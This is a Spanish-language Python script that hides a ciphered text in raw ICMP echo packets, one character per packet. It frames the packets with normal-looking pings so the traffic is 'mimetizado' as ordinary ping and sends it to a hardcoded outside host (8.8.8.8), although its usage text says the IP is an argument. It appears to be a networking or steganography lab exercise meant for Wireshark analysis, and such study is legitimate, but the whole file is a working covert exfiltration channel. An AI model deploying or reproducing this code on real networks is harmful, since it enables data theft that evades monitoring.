#!/usr/bin/env python3
"""
Programa de Transmisión de Datos via ICMP
Uso: sudo python3 icmp_sender.py "texto_cifrado" "ip_destino"
Ejemplo: sudo python3 icmp_sender.py "lajyezdpnkjn" "127.0.0.1"
"""

import socket
import struct
import time
import random
import sys
import os

def calculate_checksum(data):
    """Calcula el checksum para el paquete ICMP"""
    if len(data) % 2:
        data += b'\x00'
    
    checksum = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        checksum += word
    
    while checksum >> 16:
        checksum = (checksum & 0xFFFF) + (checksum >> 16)
    
    return ~checksum & 0xFFFF

def create_icmp_packet(data, identifier, sequence):
    """Crea un paquete ICMP con los datos especificados"""
    # Header ICMP: tipo=8, código=0, checksum=0, identifier, sequence
    header = struct.pack('!BBHHH', 8, 0, 0, identifier, sequence)
    
    # Calcular checksum
    temp_packet = header + data
    checksum = calculate_checksum(temp_packet)
    
    # Header final con checksum
    header = struct.pack('!BBHHH', 8, 0, checksum, identifier, sequence)
    
    return header + data

def send_legitimate_ping(sock, target_ip, identifier):
    """Envía un ping legítimo para comparación"""
    print("=== PING LEGÍTIMO (ANTES) ===")
    
    # Datos típicos de ping (32 bytes)
    legitimate_data = b'abcdefghijklmnopqrstuvwxyz123456'
    packet = create_icmp_packet(legitimate_data, identifier, 1)
    
    # Análisis del paquete legítimo
    type_field, code, checksum, id_field, seq = struct.unpack('!BBHHH', packet[:8])
    print(f"Tipo: {type_field} | Código: {code} | Checksum: 0x{checksum:04x}")
    print(f"ID: {id_field} | Secuencia: {seq} | Tamaño payload: {len(legitimate_data)} bytes")
    print(f"Datos: ping estándar del sistema")
    
    try:
        sock.sendto(packet, (target_ip, 0))
        print(f"✓ Ping legítimo enviado a {target_ip}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    print()

def send_data_packets(sock, target_ip, text_data, identifier):
    """Envía el texto cifrado, un carácter por paquete ICMP"""
    print("=== TRANSMISIÓN DE DATOS OCULTOS ===")
    print(f"Texto a transmitir: '{text_data}'")
    print(f"Total de caracteres: {len(text_data)}")
    print()
    
    for i, char in enumerate(text_data):
        # Solo el carácter, SIN padding para ver mejor
        packet_data = char.encode('utf-8')
        
        # Crear paquete
        sequence = i + 2  # Continuar secuencia después del ping legítimo
        packet = create_icmp_packet(packet_data, identifier, sequence)
        
        try:
            sock.sendto(packet, (target_ip, 0))
            
            # Mostrar análisis completo del paquete
            type_field, code, checksum, id_field, seq = struct.unpack('!BBHHH', packet[:8])
            print(f"Paquete {i+1:2d}: Carácter '{char}' (ASCII: {ord(char)})")
            print(f"  Tipo: {type_field} | Código: {code} | Checksum: 0x{checksum:04x}")
            print(f"  ID: {id_field} | Secuencia: {seq} | Tamaño payload: {len(packet_data)} bytes")
            
            # Mostrar el payload completo en hex
            hex_data = ' '.join([f'{b:02x}' for b in packet_data])
            print(f"  Payload completo: {hex_data}")
            print(f"  Payload ASCII: '{packet_data.decode('utf-8', errors='ignore')}'")
            print(f"  ✓ Enviado a {target_ip}")
            
            # Delay para ver mejor en Wireshark
            time.sleep(1.0)
            
        except Exception as e:
            print(f"  ✗ Error enviando paquete {i+1}: {e}")
    
    print()

def send_final_ping(sock, target_ip, identifier, last_sequence):
    """Envía un ping legítimo final para comparación"""
    print("=== PING LEGÍTIMO (DESPUÉS) ===")
    
    # Datos típicos de ping
    legitimate_data = b'abcdefghijklmnopqrstuvwxyz123456'
    packet = create_icmp_packet(legitimate_data, identifier, last_sequence + 1)
    
    # Análisis del paquete legítimo
    type_field, code, checksum, id_field, seq = struct.unpack('!BBHHH', packet[:8])
    print(f"Tipo: {type_field} | Código: {code} | Checksum: 0x{checksum:04x}")
    print(f"ID: {id_field} | Secuencia: {seq} | Tamaño payload: {len(legitimate_data)} bytes")
    print(f"Datos: ping estándar del sistema")
    
    try:
        sock.sendto(packet, (target_ip, 0))
        print(f"✓ Ping legítimo enviado a {target_ip}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    print()

def main():
    """Función principal del programa"""
    # Verificar argumentos
    if len(sys.argv) != 3:
        print("Uso: sudo python3 icmp_sender.py \"texto_cifrado\" ")
        print("Ejemplo: sudo python3 icmp_sender.py \"lajyezdpnkjn\" ")
        sys.exit(1)
    
    text_data = sys.argv[1]
    target_ip = "8.8.8.8"  # sys.argv[2]
    
    # Validar IP
    try:
        socket.inet_aton(target_ip)
    except socket.error:
        print(f"Error: '{target_ip}' no es una dirección IP válida.")
        sys.exit(1)
    
 
    
    print("=== PROGRAMA DE TRANSMISIÓN ICMP ===")
    print(f"Texto a enviar: {text_data}")
    print(f"Destino: {target_ip}")
    print(f"Caracteres: {len(text_data)}")
    print()
    
    # Crear socket raw
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("Error: No se pueden crear sockets raw sin privilegios de administrador.")
        sys.exit(1)
    except Exception as e:
        print(f"Error creando socket: {e}")
        sys.exit(1)
    
    try:
        # Identificador único para esta sesión
        identifier = random.randint(1, 65535)
        
        # 1. Ping legítimo inicial
        send_legitimate_ping(sock, target_ip, identifier)
        time.sleep(1)
        
        # 2. Transmisión de datos ocultos
        send_data_packets(sock, target_ip, text_data, identifier)
        time.sleep(1)
        
        # 3. Ping legítimo final
        last_sequence = len(text_data) + 1
        send_final_ping(sock, target_ip, identifier, last_sequence)
        
        print("=== RESUMEN ===")
        print(f"✓ {len(text_data)} caracteres transmitidos exitosamente")
        print("✓ Tráfico mimetizado como pings normales")
        print("✓ Análisis de paquetes mostrado")
        
    except KeyboardInterrupt:
        print("\nTransmisión interrumpida por el usuario.")
    except Exception as e:
        print(f"Error durante la transmisión: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()